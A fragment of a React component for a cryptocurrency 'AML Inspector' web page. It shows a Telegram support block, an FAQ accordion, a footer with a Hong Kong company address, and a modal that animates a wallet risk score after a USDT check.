                    Were on Telegram
                  </p>
                  <small className="text-gray-500 text-xs">
                    Average response time: 30 seconds
                  </small>
                </div>
              </a>

              <small className="text-xs text-sky-900">
                Available 24/7 (response may be slower at night)
              </small>
            </div>

            {/* RIGHT FAQ list */}
            <div className="w-full space-y-5 lg:pl-10 text-black" id="faq">
              {faqs.map((item, index) => {
                const isOpen = openIndex === index;
                return (
                  <div key={index} className="border-b border-black/10 pb-4">
                    <button
                      className="w-full flex justify-between items-center py-4 text-left text-lg cursor-pointer"
                      onClick={() => toggleIndex(index)}
                    >
                      {item.question}
                      <span className="text-2xl">{isOpen ? "−" : "+"}</span>
                    </button>

                    <div
                      className={`overflow-hidden transition-all duration-300 ${isOpen
                        ? "max-h-[300px] opacity-100"
                        : "max-h-0 opacity-0"
                        }`}
                    >
                      <p className="text-gray-600 text-base pr-6 py-3">
                        {item.answer}
                      </p>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </section>

      <footer className="bg-black text-neutral-400 py-16">
        <div className="max-w-[1250px] mx-auto px-5">
          {/* Logo + Address */}
          <div className="border-b border-neutral-700 pb-10 mb-10">




            <p className="text-sm font-bold tracking-wide">
              SAFELEMENT LIMITED
            </p>

            <p className="text-xs max-w-xs uppercase leading-5 mt-2">
              FLAT H 3/F TOWER 5 THE BEAUMOUNT 8 <br /> SHEK KOK ROAD TSEUNG
              KWAN O NT, <br /> HONG KONG
            </p>
          </div>

          {/* Footer Navigation */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-12">
            {/* Products Column */}


            {/* Legal Column */}
            <div>
              <h3 className="text-lg font-semibold mb-5">
                Regulatory framework
              </h3>
              <ul className="flex items-center gap-2">
                <li>
                  <a
                    href="#"
                    className="px-3 py-2 text-sm text-gray-400 rounded-lg cursor-pointer transition-all duration-300 hover:text-white hover:bg-white/10"
                  >
                    Terms of Service
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    className="px-3 py-2 text-sm text-gray-400 rounded-lg cursor-pointer transition-all duration-300 hover:text-white hover:bg-white/10"
                  >
                    Privacy Policy
                  </a>
                </li>
              </ul>
            </div>


          </div>

          {/* Bottom Copyright */}
          <div className="mt-14 text-center text-xs text-neutral-600">
            © {new Date().getFullYear()} AML Inspector
          </div>
        </div>
      </footer>







      {/* ---- SUCCESS MODAL ---- */}
      {(showPopup || showPopupTRX) && (() => {
        // SVG circle math  r=54, circumference≈339
        const R = 54;
        const C = 2 * Math.PI * R; // 339.3
        const filled = (scoreDisplay / 100) * C;
        const dashOffset = C - filled;
        return (
          <div className="fixed inset-0 z-[25000] flex items-center justify-center bg-black/60 backdrop-blur-sm px-4">
            <div className="relative w-full max-w-sm rounded-3xl bg-white p-8 shadow-2xl text-center">

              {/* Title */}
              <h2 className="text-xl font-bold text-slate-900 mb-1">
                ✅ Your USDT is verified successfully
              </h2>
              <p className="text-sm text-slate-500 mb-8">
                {scoreSettled ? "AML risk analysis complete." : "Calculating risk score…"}
              </p>

              {/* Animated Score Circle */}
              <div className="relative mx-auto mb-6" style={{ width: 140, height: 140 }}>
                <svg width="140" height="140" viewBox="0 0 140 140" className="-rotate-90">
                  {/* Track */}
                  <circle cx="70" cy="70" r={R} fill="none" stroke="#e5e7eb" strokeWidth="10" />
                  {/* Progress */}
                  <circle
                    cx="70" cy="70" r={R}
                    fill="none"
                    stroke="#3b82f6"
                    strokeWidth="10"
                    strokeLinecap="round"
                    strokeDasharray={C}
                    strokeDashoffset={dashOffset}
                    style={{ transition: scoreSettled ? "stroke-dashoffset 0.4s ease" : "none" }}
                  />
                </svg>
                {/* Score number in centre */}
                <div className="absolute inset-0 flex flex-col items-center justify-center">
                  <span
                    className="text-4xl font-black"
                    style={{ color: "#2563eb", fontVariantNumeric: "tabular-nums" }}
                  >
                    {scoreDisplay}
                  </span>
                  <span className="text-xs font-semibold text-slate-400 mt-0.5">/ 100</span>
                </div>
              </div>

              {/* Label */}
              <p className="text-sm font-semibold text-blue-600 mb-6">
                {scoreSettled ? "✅ Low Risk — Safe Wallet" : "⏳ Risk Score Calculating…"}
              </p>

              <button
                onClick={() => { setShowPopup(false); setShowPopupTRX(false); }}
                className="w-full py-3 rounded-2xl bg-blue-600 text-white font-semibold text-sm hover:bg-blue-700 transition"
              >
                Done
              </button>
            </div>
          </div>
        );
      })()}

    </>
  );
}
